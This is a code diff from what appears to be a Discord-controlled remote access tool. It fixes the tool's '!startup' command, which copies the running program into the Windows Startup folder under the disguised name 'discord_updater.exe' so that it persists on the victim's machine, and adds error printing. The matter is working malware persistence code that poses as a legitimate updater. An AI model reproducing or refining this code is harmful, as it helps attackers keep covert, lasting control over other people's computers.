@@ -148,10 +148,11 @@ async def on_message(message):
     if message.content == "!startup":
         path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         try:
-            shutil.copyfile(os.path.join(os.getcwd(), __name__), os.path.join(path, "discord_updater.exe"))
+            shutil.copyfile(os.path.join(os.getcwd(), __file__), os.path.join(path, "discord_updater.exe"))
             embed = discord.Embed(title="Startup", description=f"```{os.path.join(path, 'discord.exe')}```", color=0xfafafa)
             await message.reply(embed=embed)
-        except:
+        except Exception as e:
+            print(e)
             embed = discord.Embed(title="Error", description=f"```Failed to add to startup```", color=0xfafafa)
             await message.reply(embed=embed)
 
